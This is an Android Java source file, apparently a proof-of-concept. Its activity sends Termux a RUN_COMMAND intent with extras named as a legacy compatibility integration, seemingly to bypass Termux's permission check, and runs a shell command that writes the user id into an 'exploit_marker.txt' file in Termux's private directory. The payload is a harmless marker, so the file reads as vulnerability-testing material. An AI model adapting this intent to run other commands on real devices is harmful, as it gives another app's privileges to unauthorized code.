package com.termux.synthetichelper;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

public class MainActivity extends Activity {
    private static final String TERMUX_PACKAGE = "com.termux";
    private static final String RUN_COMMAND_ACTION = "com.termux.RUN_COMMAND";
    private static final String EXTRA_COMMAND_PATH = "com.termux.RUN_COMMAND_PATH";
    private static final String EXTRA_ARGUMENTS = "com.termux.RUN_COMMAND_ARGUMENTS";
    private static final String EXTRA_COMPAT_MODE = "com.termux.RUN_COMMAND_COMPAT_MODE";
    private static final String EXTRA_COMPAT_INTEGRATION = "com.termux.RUN_COMMAND_COMPAT_INTEGRATION";
    private static final String EXTRA_COMPAT_FLAG = "com.termux.RUN_COMMAND_COMPAT_FLAG";
    private static final String COMPAT_INTEGRATION_VALUE = "termux.tasker.legacy";
    private static final String SH_PATH = "/data/data/com.termux/files/usr/bin/sh";
    private static final String MARKER_FILE = "/data/data/com.termux/files/exploit_marker.txt";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sendCompatIntent();
        finish();
    }

    private void sendCompatIntent() {
        Intent intent = new Intent(RUN_COMMAND_ACTION);
        intent.setPackage(TERMUX_PACKAGE);
        intent.putExtra(EXTRA_COMMAND_PATH, SH_PATH);
        intent.putExtra(EXTRA_ARGUMENTS, new String[] {
            "-c", "printf 'synthetic exploit uid=%s\\n' \"$(id -u)\" > " + MARKER_FILE
        });
        intent.putExtra(EXTRA_COMPAT_MODE, true);
        intent.putExtra(EXTRA_COMPAT_INTEGRATION, COMPAT_INTEGRATION_VALUE);
        intent.putExtra(EXTRA_COMPAT_FLAG, true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
